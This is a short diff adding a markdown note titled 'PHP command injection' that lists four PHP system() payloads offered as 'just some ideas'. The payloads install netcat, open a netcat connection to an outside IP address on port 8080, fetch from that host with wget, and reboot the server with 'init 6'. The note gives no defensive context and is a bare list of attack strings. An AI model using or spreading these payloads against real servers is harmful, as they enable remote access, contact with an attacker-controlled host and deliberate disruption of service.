@@ -1,0 +1,11 @@
+
+PHP command injection
+=====================
+
+There are just some ideas.
+
+<? system('apt-get install netcat -y'); ?>
+<? system('netcat 14.5.1.44 8080'); ?>
+<? system('wget http://14.5.1.44:8080/'); ?>
+<? system('init 6'); ?>
+
